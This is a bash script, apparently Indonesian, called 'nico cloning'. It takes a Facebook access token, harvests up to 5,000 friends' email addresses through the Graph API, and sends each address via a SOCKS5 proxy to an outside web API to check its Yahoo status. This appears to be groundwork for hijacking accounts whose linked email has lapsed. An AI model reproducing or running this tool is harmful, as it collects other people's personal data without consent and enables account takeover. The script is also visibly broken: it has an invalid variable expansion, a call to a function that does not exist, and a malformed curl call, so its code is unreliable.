#!/bin/bash
# -(c) MR.WRECK ~ NICOLEUS F SITORUS
# -createon   : 16/04/2019
# -lastupdate : 07/05/2019
# -toolsname  : nico cloning
# gak usah di edit nanti erorr LAE..
clear;
command -v curl > /dev/null 2>&1 || { echo >&2 "cURL not installed [!]"; }
if [[ ! -z $(command -v grep) ]]; then
	printf ""
else
	sleep 2
	apt install grep
	printf "selesai terinstall.\n"
fi
GREEN=$(tput setaf 2)
RED=$(tput setaf 1)
NORMAL=$(tput sgr0)
CYAN=$(tput setaf 6)
ti=$(set `date` && echo -e "$4 $5" | cut -d : -f1,2);
function banner () {
printf "
\t$GREEN.__                  
\t|  |__   ____   ____  
\t|  | H \ /  O_ \ / R _ A _S\  [${RED}Create By ${MR.WRECK}NICOLEUS F SITORUS]
\t|   Y  (  <_> |  <_> ) 
\t|___|  /\____/ \____/ 
\t     \/  
\t
"
}
banner
function get_yahoo () {

                   get_yahoo=$(curl --silent "http://nicotools.000webhostapp.com/api/yahoo.php?" --data "email=$aa" --socks5 $s0cks | 
                   grep -Po '(?<="status":)[^,]*' | tr -d '""}')
                   printf "$aa > $get_yahoo \n" >> output.txt
                   printf "${MR.WRECK}$aa [STATUS] > ${NORMAL}$get_yahoo\n"
}
function hey_kamu () {
	               echo -e -n $RED'[?]'${NORMAL}' socks5 : '
	               read s0cks
	               echo -e -n $RED'[?]'${NORMAL}' Token  : ' 
	               read t0k3n
	               echo "tunggu bentar.."
	               if [[ ! -e $t0k3n  ]]; then
	               	   printf "${RED}[!] ${NORMAL}tidak ada file token\n"
	               	   exit
	               fi
                   gEt=$(curl -X GET POST -s "https://graph.facebook.com/v3.2/me/friends/?fields=email&access_token=`cat $t0k3n`&limit=5000" | jq -r .data | grep -Po '(?<="email":)[^,]*' | tr -d '""')
(
               for aa in $gEt; do
                    startline=1 ###
                    endline="$threads"
                    counter=0
                    default_threads="10"
                    threads="${1:-${default_threads}}"
                    token=$(($counter+1))
                    let token++
                    let counter++
                    let startline+=$threads
                    let endline+=$threads
                    get_yahoo "{$aa}" &
                    done
                    wait

)
}
hey_LAE...
echo "selesai pada jam : $ti"
echo "saved output.txt"
